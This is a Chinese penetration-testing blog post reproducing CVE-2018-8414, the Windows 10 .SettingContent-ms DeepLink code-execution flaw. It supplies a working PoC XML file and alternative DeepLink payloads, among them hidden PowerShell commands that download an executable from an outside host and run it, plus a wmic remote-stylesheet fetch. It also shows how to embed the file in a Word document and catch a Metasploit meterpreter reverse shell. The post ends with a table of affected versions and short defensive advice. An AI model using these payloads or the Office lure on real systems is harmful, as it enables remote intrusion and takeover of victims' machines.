# Windows Shell 远程执行代码漏洞(（CVE-2018-8414）复现 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/9642241.html`](https://www.cnblogs.com/backlion/p/9642241.html)

##  0x00   SettingContent-ms 文件介绍

.SettingContent-ms 是在 Windows 10 中引入的一种文件类型，它的内容是 XML 格式进行编写的，主要用于创建 Windows 设置页面的快捷方式.Windows 10 下行.SettingContent-ms 后缀的文件，系统并未判断该类文件所在的路径是否在控制面板相关目录下，便直接执行了文件中用于控制面板设置相关的深层链接标签指定的任意程序，导致用户执行系统任意目录下的此类文件或者从网络上下载的经过精心设计的.SettingContent-ms 文件也会直接执行其中指定的恶意程序对象，导致任意代码执行.

文件包含一个<DeepLink>标记，它带有带参数的任何二进制文件并执行它。这可能会导致问题，因为攻击者可以使用指向二进制文件（如 cmd.exe 或 PowerShell.exe）的 DeepLink 元素创建.SettingContent-ms 文件，该文件为其提供 shell 命令执行。

## 0x01 Windows Defender AV ASR Rules

Windows Defender AV ASR Rules 主要是为了解决防止漏洞利用恶意软件感染计算机和应用程序，它是在 Windows 10, version 1709 and later 和 Windows Server 2016 中引入的，所有说之前的 Windows Defender 版本是没有 ASR Rules 的。

从以下版本开始：Windows 10 版本 1703 到 1803 和 Windows Server 版本 1709 到 1803 如下图显示是 Windows Defender AV ASR Rules 自带了 AttackSurfaceReductionRules_Ids 功能规则。

![](img/7b9fd8d9d8250b6f62d8a353a1cdc231.png)

![](img/dba5656423734242ed2bebf51a5a1f79.png)

而在低于该版本的 10240 中，Windows Defender AV ASR Rules 是没有带 AttackSurfaceReductionRules_Ids

![](img/49f977fba369969456fcf0465027b228.png)

注意：某些时候漏洞利用失败取决于文件位置（默认策略设置），因此只需要将 POC 文件复制到如下目录下就可以执行。(如果改变默认路径可以通过下载[`github.com/joesecurity/scmwrap/blob/master/scmwrap.exe 通过管理员权限下去命令执行 scmwrap.exe`](https://github.com/joesecurity/scmwrap/blob/master/scmwrap.exe 通过管理员权限下去命令执行%20scmwrap.exe)  -install)

C:\Users\[USER]\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\[LANGUAGE]\

## 0x02 漏洞复现

## 1.简单的测试弹出计算器

1.将测试 poc 文件放入以下目录位置：

C:\Users\admin（用户）

\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\zh-CN\目录下

![](img/fea5900a5da32700ee8d78907cd2be40.png)

2. 点击测试 POC 文件：

```
<?xml version="1.0" encoding="UTF-8"?>

<PCSettings>

  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">

    <ApplicationInformation>

<AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>

      <DeepLink>%windir%\system32\cmd.exe /c calc.exe</DeepLink>

<Icon>%windir%\system32\control.exe</Icon>

    </ApplicationInformation>

    <SettingIdentity>

      <PageID></PageID>

<HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>

    </SettingIdentity>

    <SettingInformation>

<Description>@shell32.dll,-4161</Description>

      <Keywords>@shell32.dll,-4161</Keywords>

    </SettingInformation>

  </SearchableContent>

</PCSettings>
```

其他<DeepLink>…</DeepLink>可替换 POC:

```
1.  %windir%\system32\cmd.exe /c "C:\Program Files\Internet Explorer\iexplore.exe" -k https://www.backlion.org/
```

```
2.   %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -wind hidden -noni -nop -nologo -Comm "(New-Object System.Net.WebClient).DownloadFile('http://192.168.225.129/pwn.exe', $Env:AppData+'\svrcheck.exe'); Start-Process $Env:AppData'\svrcheck.exe'; Exit-PSSession;"
```

```
3.  powershell-windowstyle  hiddle  (New-ObjectSystem.Net.WebClient)DownloadFile('https://www.xxx.com/test.exe',%APPDATA%\Rundll32.exe');Start-Process '%APPDATA%\Rundll32.exe'
```

```
4.  wmic os get /format:"https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/78065ca63504c9a0f41107137fbe861de487e4d4/minimalist"
```

3. 点击 test. [settingcontent-MS](https://github.com/wherethef2ckisr0da/CVE-2018-8414-POC/blob/master/poc.settingcontent-ms "poc.settingcontent-MS>"),即可弹出 calc

![](img/c5159002531272f8db65246dc25df065.png)

## 2.嵌入到 office 中弹出计算器

1.创建一个 word，这里我就拿 offcie 2007 来当例子

2.点插入-对象-选择由文件创建

![屏幕快照 2018-08-30 下午 11.39.43.png](img/fe9335f2552f37804fc43f69629e41cf.png)

4. 双击图标后即可打开即可弹出计算器、

![](img/aa15801b8aa9cab2763a3c3dff8e36e1.png)

## 3.kali 下反弹 shell

利用脚本下载地址：

[`raw.githubusercontent.com/backlion/demo/master/auto_settingcontent-ms.py`](https://raw.githubusercontent.com/backlion/demo/master/auto_settingcontent-ms.py)

1.在 KALI 下执行脚本 auto_settingcontent-ms.py,并填上监听 IP 地址（KALI 本机主机 IP）和端口

```
root@kali2018:/opt# python auto_settingcontent-ms.py
```

![](img/8db1882b45df487018be2d2472ca655b.png)

2.会在当前目录下生成一个 Test.SettingContent-ms 以及将生成的 LICENSE.txt 自动拷贝到/var/www/html 目录下。

![](img/9fe66b80d9f2a73f67f69f66fe043655.png)

![](img/89906df32c4bdff34c5a0d642d42a31f.png)

5.开启 apache 服务。

```
root@kali2018:/opt# service apache2 start
```

![](img/9a86341c63d4e8cc2c9e4210dbf6934d.png)

6.启动 msf，然后进行设置 IP 地址和监听端口以及 payload

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload    windows/meterpreter/reverse_https

msf exploit(multi/handler) > show options

msf exploit(multi/handler) > set lhost     10.250.117.10 msf exploit(multi/handler) > set lport     5555 msf exploit(multi/handler) > exploit
```

![](img/439f39692c533dc8fbd7648c26d85d3a.png)

![](img/bae4f3364d5c311c9486f8333858166f.png)

7.将生成的 Test.SettingContent-ms 拷贝出来，然后新建一个 test.doc 文档，通过插入数据

![](img/5dc66510eaf4e0d46ce281b4f468ef52.png)![](img/77e14b3e1b85c8bbc78444796d00ff17.png)

![](img/29597edae7ec106c673efd0a43566c29.png)

8.然后点击保持 test.docx，并打开该文档点击图标即可反弹。

![](img/05499e303ed14cab868d9652b9f59c68.png)

9.可以看到 kali 下反弹目标系统 shell.

![](img/8c20498271438093e6667bd7219cdc5c.png)

![](img/6010848e0b0fcf0d63902b6d30dd2bd1.png)

## 0x03  漏洞影响版本

| 适用于 32 位系统的 Windows 10 版本 1703 |   | [4343885](https://support.microsoft.com/help/4343885) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343885) | 远程执行代码 | 重要 | 4338826 |
| 适用于基于 x64 的系统的 Windows 10 版本 1703 |   | [4343885](https://support.microsoft.com/help/4343885) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343885) | 远程执行代码 | 重要 | 4338826 |
| 适用于 32 位系统的 Windows 10 版本 1709 |   | [4343897](https://support.microsoft.com/help/4343897) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343897) | 远程执行代码 | 重要 | 4338825 |
| 适用于 64 位系统的 Windows 10 版本 1709 |   | [4343897](https://support.microsoft.com/help/4343897) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343897) | 远程执行代码 | 重要 | 4338825 |
| 用于 32 位系统的 Windows 10 版本 1803 |   | [4343909](https://support.microsoft.com/help/4343909) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343909) | 远程执行代码 | 重要 | 4338819 |
| 适用于基于 x64 的系统的 Windows 10 版本 1803 |   | [4343909](https://support.microsoft.com/help/4343909) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343909) | 远程执行代码 | 重要 | 4338819 |  |
| Windows Server，版本 1709（服务器核心安装） |   | [4343897](https://support.microsoft.com/help/4343897) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343897) | 远程执行代码 | 重要 | 4338825 |  |
| Windows Server，版本 1803（服务器核心安装） |   | [4343909](https://support.microsoft.com/help/4343909) | [安全更新](https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4343909) | 远程执行代码 | 重要 | 4338819 |  |

## 0x04 漏洞防御建议

最好在防火墙和/或电子邮件网关阻止.SettingContent-ms 文件通过执行。此外，可能还需要考虑使用组策略强制.SettingContent-ms 禁止在记事本中打开（[`montour.co/2016/09/group-policy-force-js-files/`](https://montour.co/2016/09/group-policy-force-js-files/)）。

## 0x05  参考链接

[`www.t00ls.net/thread-47622-1-1.html`](https://www.t00ls.net/thread-47622-1-1.html)

[`hk.saowen.com/a/18ea08a24efd7d58c9d24ce69cad41aac8e1535026d266a3e6ced826d777a341`](https://hk.saowen.com/a/18ea08a24efd7d58c9d24ce69cad41aac8e1535026d266a3e6ced826d777a341)

[`posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39`](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39)

[`github.com/joesecurity/scmwrap`](https://github.com/joesecurity/scmwrap)

[`github.com/SScyber0/Deeplink_Reverse_TCP`](https://github.com/SScyber0/Deeplink_Reverse_TCP)